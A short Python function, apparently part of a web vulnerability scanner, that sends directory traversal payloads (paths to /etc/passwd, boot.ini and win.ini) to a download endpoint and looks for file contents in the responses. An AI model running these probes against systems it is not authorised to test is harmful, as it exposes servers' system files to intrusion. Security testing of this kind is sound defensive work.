import requests

def directory_traversal_test(base_url, options=None):
    """
    Tests for directory traversal by sending common file path patterns 
    (e.g., ../../etc/passwd). Returns logs, a severity score, and a success flag.
    """
    if options is None:
        options = {}
    
    logs = []
    success = True
    score = 7  # Example severity score
    
    # Minimal set of directory traversal payloads
    payloads = [
        "../../etc/passwd",
        "../../../boot.ini",
        "../windows/win.ini",
    ]
    
    endpoint = options.get("endpoint", "/download")
    param_name = options.get("param_name", "file")
    
    for payload in payloads:
        url = f"{base_url.rstrip('/')}{endpoint}?{param_name}={payload}"
        try:
            response = requests.get(url, timeout=10)
            msg = f"[DirTraversal Test] Sent payload {payload} to {url} (Status: {response.status_code})"
            logs.append(msg)
            
            # Basic check: see if we get signs of sensitive files in response
            if "root:x" in response.text or "[extensions]" in response.text:
                detection = f"Possible directory traversal vulnerability with payload '{payload}'."
                logs.append(detection)
        except Exception as e:
            success = False
            error_msg = f"Error while testing directory traversal '{payload}': {str(e)}"
            logs.append(error_msg)
    
    return logs, score, success
